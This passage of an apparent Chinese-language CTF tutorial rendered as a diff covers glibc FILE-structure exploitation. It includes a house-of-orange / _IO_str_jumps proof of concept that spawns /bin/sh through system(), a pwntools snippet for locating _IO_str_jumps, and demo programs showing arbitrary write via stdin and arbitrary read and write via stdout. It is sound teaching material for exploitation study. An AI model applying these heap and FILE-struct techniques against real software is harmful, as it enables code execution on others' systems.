+    p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    top <span class="token operator">=</span> <span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> p1 <span class="token operator">+</span> <span class="token number">0x400</span> <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    top<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xc01</span><span class="token punctuation">;</span>
+    p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    io_list_all <span class="token operator">=</span> top<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x9a8</span><span class="token punctuation">;</span>
+    top<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> io_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// _IO_str_overflow conditions</span>
+    <span class="token keyword">char</span> binsh_in_libc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// we can found "/bin/sh" in libc, here i create it in stack</span>
+
+    top<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//_flags</span>
+    top<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// write_base</span>
+    top<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span><span class="token operator">&amp;</span>binsh_in_libc<span class="token number">-100</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// write_ptr</span>
+    top<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// buf_base</span>
+    top<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span><span class="token operator">&amp;</span>binsh_in_libc<span class="token number">-100</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// buf_end</span>
+    <span class="token comment" spellcheck="true">// house_of_orange conditions</span>
+    top<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>
+
+    top<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x7ffff7dd1500</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//_IO_str_jumps </span>
+    top<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> <span class="token operator">&amp;</span>winner<span class="token punctuation">;</span>
+
+    <span class="token comment" spellcheck="true">/* Finally, trigger the whole chain by calling malloc */</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">int</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span>
+<span class="token punctuation">{</span> 
+    <span class="token function">system</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<h2 id="IO-str-jumps定位"><a href="#IO-str-jumps定位" class="headerlink" title="_IO_str_jumps定位"></a>_IO_str_jumps定位</h2><ul>
+<li>IDA寻找_IO_file_jumps在后面找到_IO_str_****的函数表即可</li>
+<li>法二如下：<pre class=" language-python"><code class="language-python">IO_file_jumps_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_file_jumps'</span><span class="token punctuation">]</span>
+IO_str_underflow_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_str_underflow'</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> ref_offset <span class="token keyword">in</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>IO_str_underflow_offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  possible_IO_str_jumps_offset <span class="token operator">=</span> ref_offset <span class="token operator">-</span> <span class="token number">0x20</span>
+  <span class="token keyword">if</span> possible_IO_str_jumps_offset <span class="token operator">></span> IO_file_jumps_offset<span class="token punctuation">:</span>
+      <span class="token keyword">print</span> possible_IO_str_jumps_offset
+      <span class="token keyword">break</span></code></pre>
+</li>
+</ul>
+<h2 id="stdin，stdout任意读写"><a href="#stdin，stdout任意读写" class="headerlink" title="stdin，stdout任意读写"></a>stdin，stdout任意读写</h2><h3 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a>setvbuf</h3><p>C 库函数 int setvbuf(FILE *stream, char *buffer, int mode, size_t size) 定义流 stream 应如何缓冲。</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">setvbuf</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token keyword">int</span> mode<span class="token punctuation">,</span> size_t size<span class="token punctuation">)</span></code></pre>
+<ul>
+<li>stream – 这是指向 FILE 对象的指针，该 FILE 对象标识了一个打开的流。</li>
+<li>buffer – 这是分配给用户的缓冲。如果设置为 NULL，该函数会自动分配一个指定大小的缓冲。</li>
+<li>mode – 这指定了文件缓冲的模式：<br>模式 和 描述<blockquote>
+<p>_IOFBF 全缓冲：对于输出，数据在缓冲填满时被一次性写入。对于输入，缓冲会在请求输入且缓冲为空时被填充。<br>_IOLBF 行缓冲：对于输出，数据在遇到换行符或者在缓冲填满时被写入，具体视情况而定。对于输入，缓冲会在请求输入且缓冲为空时被填充，直到遇到下一个换行符。<br>_IONBF 无缓冲：不使用缓冲。每个 I/O 操作都被即时写入。buffer 和 size 参数被忽略。</p>
+</blockquote>
+</li>
+<li>size –这是缓冲的大小，以字节为单位。</li>
+</ul>
+<p>一般常见的是：setvbuf（stdin,0,2,0)，setvbuf（stdout,0,2,0) 也就是第三个模式：无缓冲。<br>设置stdin：</p>
+<pre class=" language-c"><code class="language-c">    _IO_read_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd1963</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_read_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd1963</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_read_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd1963</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_write_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd1963</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_write_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd1963</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_write_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd1963</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_buf_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd1963</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_buf_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd1964</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">132</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> </code></pre>
+<p>设置stdout</p>
+<pre class=" language-c"><code class="language-c">    _IO_read_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd26a3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_read_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd26a3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_read_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd26a3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_write_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd26a3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_write_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd26a3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_write_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd26a3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_buf_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd26a3</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">131</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> 
+    _IO_buf_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd26a4</span> <span class="token operator">&lt;</span>_IO_2_1_stdout_<span class="token operator">+</span><span class="token number">132</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">,</span> </code></pre>
+<p>所以在关闭缓冲区后除了_IO_buf_end，其他都指向同一地址，_IO_buf_end指向下一个。如果不关闭缓冲区，这些指针一般会指向分配得到的堆地址</p>
+<p>这些指针对于IO操作有决定性作用，所以学习一下代表意义：</p>
+<pre class=" language-java"><code class="language-java">_IO_buf_base <span class="token operator">:</span> 缓冲区起始地址
+_IO_buf_end  <span class="token operator">:</span> 缓冲区结束地址
+ _IO_read_base <span class="token operator">:</span> stdin 缓冲起始地址
+ _IO_read_end  <span class="token operator">:</span> stdin 缓冲结束地址
+ _IO_write_base <span class="token operator">:</span> stdout 缓冲起始地址
+ _IO_write_end  <span class="token operator">:</span> stdout 缓冲结束地址
+
+_IO_read_ptr  _IO_write_ptr  <span class="token operator">:</span> 操作起始地址</code></pre>
+<h3 id="stdin—fread任意写"><a href="#stdin—fread任意写" class="headerlink" title="stdin—fread任意写"></a>stdin—fread任意写</h3><pre class=" language-c"><code class="language-c">_IO_file_xsgetn<span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true">/*判断缓冲区是否为空，为空调用_IO_doallocbuf进行初始化*/</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_buf_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//bypass</span>
+<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
+have <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>have <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//bypass 因为我们最终目的是调用sys_read</span>
+      <span class="token punctuation">{</span>
+          将输入缓冲区中的内容拷贝至目标地址。
+      <span class="token punctuation">}</span>
+<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
+<span class="token function">__underflow</span><span class="token punctuation">(</span>_IO_new_file_underflow<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_READS<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//bypass _IO_NO_READS = 4</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> 
+    <span class="token punctuation">}</span>
+<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">&lt;</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//bypass</span>
+        <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>
+
+最终调用<span class="token punctuation">:</span><span class="token function">_IO_SYSREAD</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">,</span>fp<span class="token operator">-></span>_IO_buf_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_buf_base<span class="token punctuation">)</span>    </code></pre>
+<p>构造：</p>
+<ul>
+<li>设置_IO_buf_base为target_start，_IO_buf_end为target_end（_IO_buf_end-_IO_buf_base要大于0）</li>
+<li>flag位不能含有4（_IO_NO_READS），_fileno要为0。（最好就直接使用原本的flag）</li>
+<li>设置_IO_read_end等于_IO_read_ptr。</li>
+</ul>
+<h4 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h4><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
+
+<span class="token keyword">char</span> mybuf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//0x601100</span>
+<span class="token keyword">char</span> leakbuf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Success!!!!!!!!"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//0x601060</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>buf_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd1918</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>buf_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd1920</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>fileno <span class="token operator">=</span> <span class="token number">0x7ffff7dd1950</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>read_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd18f0</span> <span class="token punctuation">,</span> <span class="token operator">*</span>read_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd18e8</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">char</span> array<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span>buf_base <span class="token operator">=</span> <span class="token operator">&amp;</span>mybuf<span class="token punctuation">;</span>
+    <span class="token operator">*</span>buf_end <span class="token operator">=</span> <span class="token operator">&amp;</span>mybuf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span>fileno <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span>read_end <span class="token operator">=</span> <span class="token operator">*</span>read_ptr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+结果：
+pwndbg<span class="token operator">></span> p mybuf 
+$<span class="token number">2</span> <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">&lt;</span>repeats <span class="token number">12</span> times<span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">'\000'</span> <span class="token operator">&lt;</span>repeats <span class="token number">86</span> times<span class="token operator">></span> 成功写入全局变量mybuf</code></pre>
+<p>其实scanf更简单构造：<br>我们可以知道它是向fp-&gt;_IO_buf_base处写入（fp-&gt;_IO_buf_end – fp-&gt;_IO_buf_base）长度的数据。<br>只要我们可以修改_IO_buf_base和_IO_buf_end就可以实现任意位置任意长度的数据写入。</p>
+<h3 id="stdout—fwrite任意读写"><a href="#stdout—fwrite任意读写" class="headerlink" title="stdout—fwrite任意读写"></a>stdout—fwrite任意读写</h3><p>stdout能将缓冲区数据输出，所以多一个读功能</p>
+<pre class=" language-java"><code class="language-java">_IO_write_ptr：_IO_write_ptr和_IO_write_base之间的地址为已使用的缓冲区
+_IO_write_ptr和_IO_write_end之间为未使用的缓冲区。</code></pre>
+<h4 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h4><pre class=" language-c"><code class="language-c"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_end <span class="token operator">></span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">)</span>
+    count <span class="token operator">=</span> f<span class="token operator">-></span>_IO_write_end <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">//把数据拷贝到缓冲区。</span>
+<span class="token punctuation">}</span>
+<span class="token comment" spellcheck="true">//他的任意写是基于_IO_new_file_xsputn中将数据复制到缓冲区这一功能能实现的。</span></code></pre>
+<p>构造：_IO_write_ptr为target_s，_IO_write_end为target_e</p>
+<h4 id="演示-3"><a href="#演示-3" class="headerlink" title="演示"></a>演示</h4><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
+
+<span class="token keyword">char</span> mybuf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//0x601100</span>
+<span class="token keyword">char</span> leakbuf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Success!!!!!!!!"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//0x601060</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>write_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd2648</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>write_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd2650</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>write_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd2640</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>_fileno <span class="token operator">=</span> <span class="token number">0x7ffff7dd2690</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>read_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd2630</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token operator">*</span>write_ptr <span class="token operator">=</span> <span class="token operator">&amp;</span>mybuf<span class="token punctuation">;</span>
+    <span class="token operator">*</span>write_end <span class="token operator">=</span> <span class="token operator">&amp;</span>mybuf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span><span class="token string">"BBBBBBBBBBBBBA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+pwndbg<span class="token operator">></span> p mybuf 
+$<span class="token number">3</span> <span class="token operator">=</span> <span class="token string">'B'</span> <span class="token operator">&lt;</span>repeats <span class="token number">13</span> times<span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">"A\n"</span><span class="token punctuation">,</span> <span class="token string">'\000'</span> <span class="token operator">&lt;</span>repeats <span class="token number">84</span> times<span class="token operator">></span> <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>成功写入mybuf</code></pre>
+<h4 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h4><p>fwrite的关键流程：_IO_new_file_xsputn —&gt; _IO_OVERFLOW(_IO_new_file_overflow) —&gt;_IO_do_write</p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_end <span class="token operator">></span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">)</span>
+    count <span class="token operator">=</span> f<span class="token operator">-></span>_IO_write_end <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_ptr<span class="token punctuation">;</span>  
+<span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//bypass 使cont==0 相当于输出缓冲区没有空闲</span>
+<span class="token punctuation">{</span>
+    <span class="token comment" spellcheck="true">//把数据拷贝到缓冲区。</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>to_do <span class="token operator">+</span> must_flush <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_OVERFLOW</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
+      <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
+
+ <span class="token function">_IO_OVERFLOW</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     
+<span class="token comment" spellcheck="true">/*_IO_new_file_overflow中有两个对flag位的检查flag位不要包含8和0x800*/</span>
+ <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_NO_WRITES<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//bypass</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> f<span class="token operator">-></span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//bypass</span>
+<span class="token comment" spellcheck="true">//接下来就会调用：</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span>
+             f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> ch<span class="token punctuation">;</span>
+ <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span> 
+ <span class="token comment" spellcheck="true">/*在_IO_do_write中还有几个判断需要绕过：*/</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_IS_APPENDING<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//bypass _IO_IS_APPENDING(0x1000)</span>
+
+<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_end <span class="token operator">!=</span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//bypass fp->_IO_read_end = fp->_IO_write_base。</span></code></pre>
+<p>构造：</p>
+<ul>
+<li>flag位： 不能包含0x8、0x800、0x1000（最好就直接使用原本的flag）</li>
+<li>_fileno为1</li>
+<li>_IO_read_end  = _IO_write_base = target_s</li>
+<li>_IO_write_end  = _IO_write_ptr=target_e。</li>
+</ul>
+<h4 id="演示-4"><a href="#演示-4" class="headerlink" title="演示"></a>演示</h4><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
